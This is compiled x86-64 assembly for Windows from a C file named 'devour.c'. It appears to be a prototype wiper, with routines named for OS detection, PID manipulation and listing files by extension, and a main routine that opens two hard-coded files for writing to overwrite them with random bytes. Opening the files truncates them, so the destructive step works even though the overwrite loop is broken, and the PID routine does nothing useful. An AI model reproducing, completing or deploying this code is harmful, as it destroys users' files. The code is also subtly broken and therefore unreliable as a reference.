	.file	"devour.c"
	.text
	.def	time;	.scl	3;	.type	32;	.endef
	.seh_proc	time
time:
	pushq	%rbp
	.seh_pushreg	%rbp
	movq	%rsp, %rbp
	.seh_setframe	%rbp, 0
	subq	$32, %rsp
	.seh_stackalloc	32
	.seh_endprologue
	movq	%rcx, 16(%rbp)
	movq	16(%rbp), %rax
	movq	%rax, %rcx
	movq	__imp__time64(%rip), %rax
	call	*%rax
	addq	$32, %rsp
	popq	%rbp
	ret
	.seh_endproc
	.globl	os_detection
	.def	os_detection;	.scl	2;	.type	32;	.endef
	.seh_proc	os_detection
os_detection:
	pushq	%rbp
	.seh_pushreg	%rbp
	movq	%rsp, %rbp
	.seh_setframe	%rbp, 0
	.seh_endprologue
	movq	%rcx, 16(%rbp)
	movq	16(%rbp), %rax
	movabsq	$32500942631758199, %rdx
	movq	%rdx, (%rax)
	nop
	popq	%rbp
	ret
	.seh_endproc
	.globl	pid_manipulation
	.def	pid_manipulation;	.scl	2;	.type	32;	.endef
	.seh_proc	pid_manipulation
pid_manipulation:
	pushq	%rbp
	.seh_pushreg	%rbp
	movq	%rsp, %rbp
	.seh_setframe	%rbp, 0
	subq	$64, %rsp
	.seh_stackalloc	64
	.seh_endprologue
	movq	%rcx, 16(%rbp)
	movl	%edx, 24(%rbp)
	movl	24(%rbp), %eax
	leal	0(,%rax,4), %edx
	leaq	-20(%rbp), %rcx
	movq	16(%rbp), %rax
	movq	%rcx, %r8
	movq	%rax, %rcx
	call	K32EnumProcesses
	testl	%eax, %eax
	je	.L6
	movl	-20(%rbp), %eax
	shrl	$2, %eax
	movl	%eax, -4(%rbp)
	cmpl	$0, -4(%rbp)
	jle	.L6
	movl	$0, %ecx
	call	time
	movl	%eax, %ecx
	call	srand
	call	rand
	cltd
	idivl	-4(%rbp)
	movl	%edx, -8(%rbp)
	movl	-8(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	movq	16(%rbp), %rax
	addq	%rdx, %rax
	movl	(%rax), %eax
	movl	%eax, -12(%rbp)
	movq	__imp_GetCurrentProcessId(%rip), %rax
	call	*%rax
	movl	%eax, -16(%rbp)
	movl	-8(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	movq	16(%rbp), %rax
	addq	%rax, %rdx
	movl	-16(%rbp), %eax
	movl	%eax, (%rdx)
.L6:
	nop
	addq	$64, %rsp
	popq	%rbp
	ret
	.seh_endproc
	.section .rdata,"dr"
	.align 2
.LC0:
	.ascii "\\\0*\0.\0*\0\0\0"
	.text
	.globl	ListFilesInDirectory
	.def	ListFilesInDirectory;	.scl	2;	.type	32;	.endef
	.seh_proc	ListFilesInDirectory
ListFilesInDirectory:
	pushq	%rbp
	.seh_pushreg	%rbp
	pushq	%rbx
	.seh_pushreg	%rbx
	subq	$1192, %rsp
	.seh_stackalloc	1192
	leaq	128(%rsp), %rbp
	.seh_setframe	%rbp, 128
	.seh_endprologue
	movq	%rcx, 1088(%rbp)
	movq	%rdx, 1096(%rbp)
	movl	%r8d, 1104(%rbp)
	movq	%r9, 1112(%rbp)
	movq	1088(%rbp), %rdx
	leaq	-96(%rbp), %rax
	movq	%rax, %rcx
	call	wcscpy
	leaq	-96(%rbp), %rax
	leaq	.LC0(%rip), %rdx
	movq	%rax, %rcx
	call	wcscat
	leaq	432(%rbp), %rdx
	leaq	-96(%rbp), %rax
	movq	%rax, %rcx
	movq	__imp_FindFirstFileW(%rip), %rax
	call	*%rax
	movq	%rax, 1040(%rbp)
	cmpq	$-1, 1040(%rbp)
	je	.L14
.L8:
	movl	432(%rbp), %eax
	andl	$16, %eax
	testl	%eax, %eax
	jne	.L10
	leaq	432(%rbp), %rax
	addq	$44, %rax
	movq	%rax, %rcx
	movq	__imp_PathFindExtensionW(%rip), %rax
	call	*%rax
	movq	%rax, 1032(%rbp)
	movl	$0, 1052(%rbp)
	jmp	.L11
.L13:
	movl	1052(%rbp), %eax
	cltq
	leaq	0(,%rax,8), %rdx
	movq	1096(%rbp), %rax
	addq	%rdx, %rax
	movq	(%rax), %rdx
	movq	1032(%rbp), %rax
	movq	%rax, %rcx
	movq	__imp__wcsicmp(%rip), %rax
	call	*%rax
	testl	%eax, %eax
	jne	.L12
	movq	1120(%rbp), %rax
	movl	(%rax), %eax
	cltq
	leaq	0(,%rax,8), %rdx
	movq	1112(%rbp), %rax
	leaq	(%rdx,%rax), %rbx
	leaq	432(%rbp), %rax
	addq	$44, %rax
	movq	%rax, %rcx
	movq	__imp__wcsdup(%rip), %rax
	call	*%rax
	movq	%rax, (%rbx)
	movq	1120(%rbp), %rax
	movl	(%rax), %eax
	leal	1(%rax), %edx
	movq	1120(%rbp), %rax
	movl	%edx, (%rax)
	jmp	.L10
.L12:
	addl	$1, 1052(%rbp)
.L11:
	movl	1052(%rbp), %eax
	cmpl	1104(%rbp), %eax
	jl	.L13
.L10:
	leaq	432(%rbp), %rdx
	movq	1040(%rbp), %rax
	movq	%rax, %rcx
	movq	__imp_FindNextFileW(%rip), %rax
	call	*%rax
	testl	%eax, %eax
	jne	.L8
	movq	1040(%rbp), %rax
	movq	%rax, %rcx
	movq	__imp_FindClose(%rip), %rax
	call	*%rax
	jmp	.L7
.L14:
	nop
.L7:
	addq	$1192, %rsp
	popq	%rbx
	popq	%rbp
	ret
	.seh_endproc
	.section .rdata,"dr"
	.align 8
.LC1:
	.ascii "e\0x\0a\0m\0p\0l\0e\0_\0f\0i\0l\0e\0"
	.ascii "1\0.\0t\0x\0t\0\0\0"
	.align 8
.LC2:
	.ascii "e\0x\0a\0m\0p\0l\0e\0_\0f\0i\0l\0e\0"
	.ascii "2\0.\0t\0x\0t\0\0\0"
	.align 2
.LC3:
	.ascii "w\0b\0\0\0"
	.text
	.globl	ProcessFilesAndWriteRandomData
	.def	ProcessFilesAndWriteRandomData;	.scl	2;	.type	32;	.endef
	.seh_proc	ProcessFilesAndWriteRandomData
ProcessFilesAndWriteRandomData:
	pushq	%rbp
	.seh_pushreg	%rbp
	movq	%rsp, %rbp
	.seh_setframe	%rbp, 0
	subq	$96, %rsp
	.seh_stackalloc	96
	.seh_endprologue
	leaq	.LC1(%rip), %rax
	movq	%rax, -48(%rbp)
	leaq	.LC2(%rip), %rax
	movq	%rax, -40(%rbp)
	movl	$2, -12(%rbp)
	movl	$0, -4(%rbp)
	jmp	.L16
.L20:
	movl	-4(%rbp), %eax
	cltq
	movq	-48(%rbp,%rax,8), %rax
	leaq	.LC3(%rip), %rdx
	movq	%rax, %rcx
	movq	__imp__wfopen(%rip), %rax
	call	*%rax
	movq	%rax, -24(%rbp)
	cmpq	$0, -24(%rbp)
	je	.L17
	movq	-24(%rbp), %rax
	movl	$2, %r8d
	movl	$0, %edx
	movq	%rax, %rcx
	call	fseek
	movq	-24(%rbp), %rax
	movq	%rax, %rcx
	call	ftell
	movl	%eax, -28(%rbp)
	movq	-24(%rbp), %rax
	movl	$0, %r8d
	movl	$0, %edx
	movq	%rax, %rcx
	call	fseek
	movl	$0, -8(%rbp)
	jmp	.L18
.L19:
	call	rand
	movl	%eax, %edx
	movl	%edx, %eax
	sarl	$31, %eax
	shrl	$24, %eax
	addl	%eax, %edx
	movzbl	%dl, %edx
	subl	%eax, %edx
	movl	%edx, %eax
	movb	%al, -49(%rbp)
	movq	-24(%rbp), %rdx
	leaq	-49(%rbp), %rax
	movq	%rdx, %r9
	movl	$1, %r8d
	movl	$1, %edx
	movq	%rax, %rcx
	call	fwrite
	addl	$1, -8(%rbp)
.L18:
	movl	-8(%rbp), %eax
	cmpl	-28(%rbp), %eax
	jl	.L19
	movq	-24(%rbp), %rax
	movq	%rax, %rcx
	call	fclose
.L17:
	addl	$1, -4(%rbp)
.L16:
	movl	-4(%rbp), %eax
	cmpl	-12(%rbp), %eax
	jl	.L20
	nop
	nop
	addq	$96, %rsp
	popq	%rbp
	ret
	.seh_endproc
	.def	__main;	.scl	2;	.type	32;	.endef
	.globl	main
	.def	main;	.scl	2;	.type	32;	.endef
	.seh_proc	main
main:
	pushq	%rbp
	.seh_pushreg	%rbp
	movq	%rsp, %rbp
	.seh_setframe	%rbp, 0
	subq	$32, %rsp
	.seh_stackalloc	32
	.seh_endprologue
	call	__main
	call	ProcessFilesAndWriteRandomData
	movl	$0, %eax
	addq	$32, %rsp
	popq	%rbp
	ret
	.seh_endproc
	.ident	"GCC: (Rev6, Built by MSYS2 project) 12.2.0"
	.def	K32EnumProcesses;	.scl	2;	.type	32;	.endef
	.def	srand;	.scl	2;	.type	32;	.endef
	.def	rand;	.scl	2;	.type	32;	.endef
	.def	wcscpy;	.scl	2;	.type	32;	.endef
	.def	wcscat;	.scl	2;	.type	32;	.endef
	.def	fseek;	.scl	2;	.type	32;	.endef
	.def	ftell;	.scl	2;	.type	32;	.endef
	.def	fwrite;	.scl	2;	.type	32;	.endef
	.def	fclose;	.scl	2;	.type	32;	.endef
